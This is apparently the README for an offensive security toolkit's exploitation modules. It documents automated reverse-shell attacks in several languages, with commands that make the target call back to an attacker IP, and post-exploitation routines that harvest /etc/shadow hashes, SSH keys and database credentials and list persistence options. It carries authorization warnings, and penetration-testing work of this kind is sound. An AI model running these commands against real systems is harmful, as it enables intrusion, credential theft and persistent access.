# LeKnight Exploitation Modules

‚ö†Ô∏è **DANGER: These modules perform REAL exploitation attacks**
**Use ONLY with explicit written authorization!**

---

## Overview

The exploitation modules provide automated vulnerability exploitation capabilities including:
- Reverse shell establishment (6 techniques)
- Post-exploitation enumeration (6 phases)
- Credential harvesting
- Privilege escalation enumeration

---

## Modules

### 1. RCE Exploitation Module (`rce_exploit.sh`)

**Purpose:** Automated exploitation of Remote Code Execution vulnerabilities with reverse shell establishment.

#### Features

**6 Reverse Shell Techniques:**

1. **Bash Reverse Shells** (5 variants)
   - `/dev/tcp` method
   - exec file descriptor method
   - Background connection method

2. **Python Reverse Shells** (Python 2/3)
   - Socket-based shell
   - PTY spawn shell
   - Subprocess shell

3. **Netcat Reverse Shells**
   - Traditional netcat (`nc -e`)
   - Netcat without `-e` (mkfifo method)
   - ncat variant

4. **PHP Reverse Shells**
   - fsockopen + exec
   - fsockopen + shell_exec
   - fsockopen + system

5. **Perl Reverse Shells**
   - Socket-based connection

6. **Basic Command Execution** (fallback)
   - id, whoami, uname, ls commands

#### Usage

```bash
# Load module
source modules/exploitation/rce_exploit.sh

# Exploit RCE vulnerability
exploit_rce FINDING_ID "http://target.com/vuln.php" "cmd" PROJECT_ID "10.10.14.5" 4444

# Parameters:
# - FINDING_ID: Database finding ID
# - URL: Target URL with RCE vulnerability
# - PARAMETER: Vulnerable parameter name
# - PROJECT_ID: Current project ID
# - ATTACKER_IP: Your IP for reverse shell callback
# - ATTACKER_PORT: Listener port (default: 4444)
```

#### Automatic Features

- ‚úÖ **Listener Management:** Automatically starts netcat listeners
- ‚úÖ **Connection Detection:** Monitors for successful callbacks
- ‚úÖ **Evidence Collection:** Saves all successful exploit attempts
- ‚úÖ **Audit Logging:** Records all exploitation in `exploitation_audit.log`

#### Output Files

```
data/projects/{PROJECT_ID}/exploitation/rce_{FINDING_ID}/
‚îú‚îÄ‚îÄ bash_listener.log           # Bash shell connection log
‚îú‚îÄ‚îÄ bash_exploit_success.txt    # Successful Bash exploitation
‚îú‚îÄ‚îÄ python_listener.log         # Python shell connection log
‚îú‚îÄ‚îÄ python_exploit_success.txt  # Successful Python exploitation
‚îú‚îÄ‚îÄ nc_listener.log             # Netcat connection log
‚îú‚îÄ‚îÄ nc_exploit_success.txt      # Successful Netcat exploitation
‚îî‚îÄ‚îÄ command_*.txt               # Command execution outputs
```

---

### 2. Post-Exploitation Module (`post_exploit.sh`)

**Purpose:** Automated post-exploitation enumeration for privilege escalation and persistence.

#### 6-Phase Enumeration

##### **Phase 1: System Enumeration**

Collects system information:
- OS version and distribution
- Kernel version
- Hostname and architecture
- Running processes
- Environment variables

**Output:** `system_info.txt`

##### **Phase 2: User Enumeration**

Enumerates user accounts and privileges:
- Current user and UID/GID
- All users from /etc/passwd
- Users with Bash shells
- Sudo privileges (`sudo -l`)
- User groups
- Logged-in users
- Recent logins

**Output:** `users_info.txt`

##### **Phase 3: Network Enumeration**

Maps network configuration:
- Network interfaces (ip/ifconfig)
- Routing table
- DNS configuration
- Active connections (netstat/ss)
- Firewall rules (iptables/ufw)
- ARP cache

**Output:** `network_info.txt`

##### **Phase 4: Credential Harvesting** üîë

Automatically searches and extracts credentials:

**Targets:**
- `/etc/shadow` (if readable) ‚Üí **Automatically added to database**
- SSH keys (id_rsa, id_ed25519, *.pub)
- Bash history (grep for passwords, mysql, ssh)
- Database config files (config.php, .env, database.yml)
- WordPress wp-config.php ‚Üí **DB credentials auto-extracted**

**Output:** `credentials_found.txt`
**Database:** Credentials automatically stored in `credentials` table

##### **Phase 5: Privilege Escalation Enumeration** üîì

Identifies escalation vectors:
- SUID binaries
- /etc/passwd permissions
- Sudo version (CVE checks)
- Cron jobs
- File capabilities
- Kernel version with exploit suggestions:
  - Dirty COW (< 4.8.3)
  - Dirty Pipe (5.8-5.16)
  - PwnKit (CVE-2021-4034)
- NFS exports
- Docker group membership

**Output:** `privesc_vectors.txt`

##### **Phase 6: Persistence Enumeration** üîÑ

Identifies persistence opportunities:
- Writable startup scripts (/etc/rc*.d/)
- Systemd services
- SSH authorized_keys locations
- User crontabs
- Writable web directories (for web shells)

**Output:** `persistence_options.txt`

#### Usage

```bash
# Load module
source modules/exploitation/post_exploit.sh

# Run post-exploitation
post_exploit "http://target.com/vuln.php" "cmd" PROJECT_ID

# Parameters:
# - URL: Target URL (must have RCE)
# - PARAMETER: RCE parameter
# - PROJECT_ID: Current project ID
```

#### Output Files

```
data/projects/{PROJECT_ID}/exploitation/post_exploit/
‚îú‚îÄ‚îÄ system_info.txt          # System enumeration
‚îú‚îÄ‚îÄ users_info.txt           # User enumeration
‚îú‚îÄ‚îÄ network_info.txt         # Network configuration
‚îú‚îÄ‚îÄ credentials_found.txt    # Harvested credentials
‚îú‚îÄ‚îÄ privesc_vectors.txt      # Privilege escalation vectors
‚îú‚îÄ‚îÄ persistence_options.txt  # Persistence mechanisms
‚îî‚îÄ‚îÄ report.txt              # Summary report
```

#### Automatic Database Integration

The post-exploitation module automatically:
- ‚úÖ Extracts password hashes from /etc/shadow
- ‚úÖ Parses WordPress database credentials
- ‚úÖ Stores all findings in the `credentials` table
- ‚úÖ Logs source of each credential

---

## Integration with Autopilot

The exploitation modules are **automatically loaded** by Autopilot Exploit Mode:

```bash
./leknight.sh
# Navigate to: Autopilot Mode > Exploit Mode
```

### Autopilot Workflow

1. **Prompt for attacker IP/port** for reverse shells
2. **Load exploitation modules** dynamically
3. **Query database** for exploitable findings (Critical/High severity)
4. **Prioritize exploits:**
   - RCE (highest priority)
   - SQL Injection
   - LFI
5. **Execute exploits** based on vulnerability type
6. **Trigger post-exploitation** if RCE successful
7. **Generate exploitation report**

---

## Security Considerations

### Authorization Requirements ‚ö†Ô∏è

**Before using these modules, ensure:**
- ‚úÖ Written authorization from system owner
- ‚úÖ Defined scope and rules of engagement
- ‚úÖ Incident response plan in place
- ‚úÖ Legal review completed (if corporate)

### Audit Trail

All exploitation attempts are logged:

**Location:** `data/projects/{PROJECT_ID}/exploitation_audit.log`

**Log Format:**
```
[2025-01-10 14:23:15] EXPLOITATION ATTEMPT
Type: rce
Target: http://target.com/vuln.php
Details: 10.10.14.5:4444
User: kali
Hostname: attacker-vm
---
```

### Evidence Collection

All successful exploits generate:
- Timestamped evidence files
- Command outputs
- Connection logs
- Credential dumps

**Location:** `data/projects/{PROJECT_ID}/exploitation/`

---

## Dependencies

### Required
- ‚úÖ **netcat** (nc/ncat/netcat-traditional) - Reverse shell listeners
- ‚úÖ **curl** - HTTP requests
- ‚úÖ **bash** - Shell execution

### Optional (enhances capabilities)
- ‚ö†Ô∏è **python3** - Python reverse shells
- ‚ö†Ô∏è **perl** - Perl reverse shells
- ‚ö†Ô∏è **php** - PHP reverse shells (on target)

### Verification

```bash
# Check installed dependencies
which nc ncat netcat       # Any netcat variant
which python3              # Python shells
which perl                 # Perl shells
```

---

## Troubleshooting

### Reverse Shell Not Connecting

**Problem:** Listener starts but no connection received

**Possible Causes:**
1. Firewall blocking callback
2. Target has egress filtering
3. Wrong attacker IP (NAT/VPN)
4. Target doesn't have bash/python/perl

**Solutions:**
```bash
# Check firewall
sudo iptables -L INPUT | grep 4444

# Allow port
sudo iptables -A INPUT -p tcp --dport 4444 -j ACCEPT

# Verify IP visibility
curl ifconfig.me

# Test manual listener
nc -lvnp 4444
```

### No Credentials Found

**Problem:** Post-exploitation finds no credentials

**Possible Causes:**
1. Running as low-privilege user
2. No database configs present
3. History files empty

**Solutions:**
- Try privilege escalation first
- Check web application directories manually
- Look for application-specific config files

### /etc/shadow Not Readable

**Problem:** Cannot read /etc/shadow

**Expected:** This is normal for non-root users

**Next Steps:**
- Use privilege escalation vectors
- Attempt SUID exploitation
- Check for Docker escape

---

## Example: Complete Exploitation Workflow

```bash
# 1. Run autopilot to discover vulnerabilities
./leknight.sh
# Menu > Autopilot Mode > Start Autopilot

# 2. Wait for findings (RCE discovered)

# 3. Start exploit mode
# Menu > Autopilot Mode > Exploit Mode

# 4. Enter your IP and port
# IP: 10.10.14.5
# Port: 4444

# 5. Autopilot will:
#    a) Attempt 6 reverse shell techniques
#    b) If successful, ask to run post-exploitation
#    c) Enumerate system, users, network, credentials
#    d) Store credentials in database
#    e) Generate exploitation report

# 6. Review results
# data/projects/{PROJECT_ID}/exploitation/
# data/projects/{PROJECT_ID}/exploits/exploitation_report.md

# 7. Check harvested credentials
# Menu > View Results > Credentials
```

---

## Advanced Usage

### Manual Exploitation

```bash
# Load modules manually
source modules/exploitation/rce_exploit.sh
source modules/exploitation/post_exploit.sh

# 1. Start listener in separate terminal
nc -lvnp 4444

# 2. Execute RCE exploitation
exploit_rce 1 "http://target.com/cmd.php" "cmd" 1 "10.10.14.5" 4444

# 3. If shell obtained, run post-exploitation
post_exploit "http://target.com/cmd.php" "cmd" 1

# 4. Review credentials
sqlite3 data/leknight.db "SELECT * FROM credentials WHERE project_id=1;"
```

### Custom Payloads

Modules are designed for easy extension:

```bash
# Add new reverse shell technique
# Edit: modules/exploitation/rce_exploit.sh

attempt_ruby_reverse_shell() {
    local url=$1
    local param=$2
    # ... your implementation
}

# Then add to exploit_rce() function
```

---

## API Reference

### rce_exploit.sh

```bash
# Main function
exploit_rce FINDING_ID URL PARAMETER PROJECT_ID ATTACKER_IP [PORT]

# Individual techniques
attempt_bash_reverse_shell URL PARAM ATTACKER_IP PORT EXPLOIT_DIR
attempt_python_reverse_shell URL PARAM ATTACKER_IP PORT EXPLOIT_DIR
attempt_netcat_reverse_shell URL PARAM ATTACKER_IP PORT EXPLOIT_DIR
attempt_php_reverse_shell URL PARAM ATTACKER_IP PORT EXPLOIT_DIR
attempt_perl_reverse_shell URL PARAM ATTACKER_IP PORT EXPLOIT_DIR
attempt_command_execution URL PARAM EXPLOIT_DIR

# Helpers
start_listener PORT LOG_FILE
build_rce_url URL PARAM COMMAND
save_command_output EXPLOIT_DIR COMMAND OUTPUT
log_exploit_attempt PROJECT_ID TYPE TARGET DETAILS
```

### post_exploit.sh

```bash
# Main function
post_exploit URL PARAMETER PROJECT_ID

# Enumeration phases
enumerate_system URL PARAM EXPLOIT_DIR
enumerate_users URL PARAM EXPLOIT_DIR
enumerate_network URL PARAM EXPLOIT_DIR
harvest_credentials URL PARAM EXPLOIT_DIR PROJECT_ID
enumerate_privesc URL PARAM EXPLOIT_DIR
enumerate_persistence URL PARAM EXPLOIT_DIR

# Helpers
execute_rce_command URL PARAM COMMAND
generate_post_exploit_report EXPLOIT_DIR
```

---

## Contributing

To add new exploitation techniques:

1. Follow existing code structure
2. Add proper error handling
3. Include evidence collection
4. Update audit logging
5. Test thoroughly in authorized lab
6. Document in this README

---

## Legal Disclaimer

**These modules are for authorized security testing only.**

The authors and contributors:
- ‚ùå Do NOT authorize illegal use
- ‚ùå Are NOT responsible for misuse
- ‚ùå Do NOT encourage unauthorized testing

**You are solely responsible for:**
- ‚úÖ Obtaining proper authorization
- ‚úÖ Complying with all applicable laws
- ‚úÖ Respecting scope limitations
- ‚úÖ Maintaining audit trails

**Unauthorized use may result in criminal prosecution.**

---

## Support

For issues or questions:
- GitHub Issues: https://github.com/YOUR_REPO/issues
- Documentation: See main README.md
- Security Contact: [Your email/contact]

---

**Remember: With great power comes great responsibility. Hack responsibly. üéØ**
